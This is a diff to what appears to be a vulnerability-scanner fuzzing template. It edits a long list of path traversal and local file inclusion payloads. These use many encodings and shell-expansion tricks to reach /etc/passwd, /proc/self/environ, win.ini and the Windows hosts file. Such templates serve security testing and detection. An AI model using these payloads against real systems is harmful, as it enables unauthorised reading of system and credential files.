@@ -30,18 +30,17 @@ http:
         
     payloads:
       lfi:
+        - "$(br)/et$(u)c%252Fpas$(te)swd%3F/"
+        - "${br}/et${u}c%252Fpas${te}swd%3F/"
         - "%00%00c:/../../../../windows/win.ini"
-        - "../xxxml_db/../../../../../etc/passwd"
-        - "%u002e%u002e%u002e%u002e%u002e%u002e%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u0065%u0074%u0063%u002f%u0070%u0061%u0073%u0073%u0077%u0064"
-        - "%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u0065%25u0074%25u0063%25u002f%25u0070%25u0061%25u0073%25u0073%25u0077%25u0064"
         - "%00%00file:///windows/win.ini"
-        - "%u0063%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
-        - "%25u0063%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
         - "%252fetc%252fpasswd"
         - "%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/C:/Windows/win.ini"
-        - "%u0043%u002f%u0057%u0069%u006e%u0064%u006f%u0077%u0073%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
-        - "%25u0043%25u002f%25u0057%25u0069%25u006e%25u0064%25u006f%25u0077%25u0073%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
         - "%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+        - "%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u002e%25u002f%25u0065%25u0074%25u0063%25u002f%25u0070%25u0061%25u0073%25u0073%25u0077%25u0064"
+        - "%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u0077%25u0069%25u006e%25u0064%25u006f%25u0077%25u0073%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
+        - "%25u0043%25u002f%25u0057%25u0069%25u006e%25u0064%25u006f%25u0077%25u0073%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
+        - "%25u0063%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
         - "%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini"
         - "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini"
         - "%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini"
@@ -50,17 +49,24 @@ http:
         - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
         - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
         - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00"
+        - "%u002e%u002e%u002e%u002e%u002e%u002e%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u002e%u002f%u0065%u0074%u0063%u002f%u0070%u0061%u0073%u0073%u0077%u0064"
+        - "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u0077%u0069%u006e%u0064%u006f%u0077%u0073%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
+        - "%u0043%u002f%u0057%u0069%u006e%u0064%u006f%u0077%u0073%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
+        - "%u0063%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
         - ".%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini"
         - ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini"
         - ".%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
         - ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini"
         - "../../../../../../../../../Windows/win.ini"
         - "..///////..////..//////windows/win.ini"
+        - "../xxxml_db/../../../../../etc/passwd"
         - "..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini"
-        - "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u0077%u0069%u006e%u0064%u006f%u0077%u0073%u002f%u0077%u0069%u006e%u002e%u0069%u006e%u0069"
-        - "%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u002e%25u002e%25u002f%25u0077%25u0069%25u006e%25u0064%25u006f%25u0077%25u0073%25u002f%25u0077%25u0069%25u006e%25u002e%25u0069%25u006e%25u0069"
         - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
         - "./../../../../../../../../../../windows/win.ini"
+        - "///etc/%3F/../passwd"
+        - "/etc%252Fpasswd%3F/"
+        - "/etc%252Fpasswd/"
+        - "/etc/passwd%3F/"
         - "C:/Windows/win.ini"
         - "JTI1NWMlMjU1Yy4uJTI1NWMvLi4lMjU1Yy8uLiUyNTVjLy4uJTI1NWMvLi4lMjU1Yy8uLiUyNTVjLy4uJTI1NWMvLi4lMjU1Yy8uLiUyNTVjL3dpbmRvd3Mvd2luLmluaQ%3D%3D"
         - "Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vQzovd2luZG93cy93aW4uaW5p"
@@ -90,6 +96,13 @@ http:
         - "file:/etc/passwd%3F/"
         - "file:/etc/passwd?/"
         - "text:/etc/passwd"
+        - '$(br)/et$(u)c%252Fpas$(te)swd%3F/'
+        - '$(br)/et$(u)c%252Fpas$(te)swd?/'
+        - '$(br)/et$(u)c/pas$(te)swd?/'
+        - '${br}/et${u}c%252Fpas${te}swd%3F/'
+        - '${br}/et${u}c%252Fpas${te}swd?/'
+        - '${br}/et${u}c/pas${te}swd?/'
+        - '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
         - '%00../../../../../../etc/passwd%00'
         - '%00../../../../../../etc/passwd'
         - '%00/etc/passwd%00'
@@ -206,6 +219,9 @@ http:
         - '////////////%20.%20.%20/%20.%20.%20/%20.%20.%20/%20.%20.%20/%20.%20.%20/etc/passwd'
         - '/////////////../../../etc/passwd'
         - '//////////etc/environment'
+        - '///etc/%3F/../passwd'
+        - '///etc/?/../passwd'
+        - '///etc/passwd?/../passwd'
         - '//127.0.0.1/C$/Windows/system32/drivers/etc/hosts'
         - '//::1/C$/Windows/system32/drivers/etc/hosts'
         - '//?/C:/Windows/system32/drivers/etc/hosts'
@@ -221,6 +237,8 @@ http:
         - '/\?\C:\Windows\system32\drivers\etc\hosts'
         - '/\localhost/C$/Windows/system32/drivers/etc/hosts'
         - '/\localhost\C$\Windows\system32\drivers\etc\hosts'
+        - '/etc%252Fpasswd%3F/'
+        - '/etc%252Fpasswd/'
         - '/etc/environment'
         - '/etc/hosts'
         - '/etc/passwd%00'
@@ -228,8 +246,10 @@ http:
         - '/etc/passwd%00.jpg'
         - '/etc/passwd%00.php'
         - '/etc/passwd%2500'
+        - '/etc/passwd%3F/'
         - '/etc/passwd&'
         - '/etc/passwd'
+        - '/etc/passwd?/'
         - '/path/..\\..\\\..\\\..\\\/etc/passwd'
         - '/proc/self/environ'
         - '/var/www/images/../../../etc/passwd'
@@ -283,6 +303,7 @@ http:
         - '\/./C:/Windows/system32/drivers/etc/hosts'
         - '\/.\C:\Windows\system32\drivers\etc\hosts'
         - '\/127.0.0.1/C$/Windows/system32/drivers/etc/hosts'
+        - '\/127.0.0.1\C$/Windows///////\system32/drivers//////\etc/hosts.......'
         - '\/127.0.0.1\C$\Windows\system32\drivers\etc\hosts'
         - '\/::1/C$/Windows/system32/drivers/etc/hosts'
         - '\/::1\C$\Windows\system32\drivers\etc\hosts'
@@ -314,11 +335,11 @@ http:
         - 'file:///etc/?/../passwd'
         - 'file:///etc/passwd%00'
         - 'file:///etc/passwd'
-        - 'file:///etc/passwd?/../passwd'
         - 'file:/etc%252Fpasswd%3F/'
         - 'file:/etc%252Fpasswd/'
         - 'file:/etc/passwd%3F/'
         - 'file:/etc/passwd?/'
+        - 'file:\\\\etc\\passwd'
         - 'filesystem/etc/passwd'
         - 'fs/etc/passwd'
         - 'http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd'
@@ -352,16 +373,6 @@ http:
         - '{{fuzz}}etc/passwd'
         - '{{fuzz}}windows/win.ini%00.jpg'
         - '{{fuzz}}windows/win.ini'
-        - '\/127.0.0.1\C$/Windows///////\system32/drivers//////\etc/hosts.......'
-        - '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
-        - 'file:\\\\etc\\passwd'
-        - "%00%00c:/../../../../windows/win.ini"
-        - "/etc/passwd%3F/"
-        - "/etc%252Fpasswd/"
-        - "/etc%252Fpasswd%3F/"
-        - "///etc/%3F/../passwd"
-        - "${br}/et${u}c%252Fpas${te}swd%3F/"
-        - "$(br)/et$(u)c%252Fpas$(te)swd%3F/"
         
     fuzzing:
       - part: body
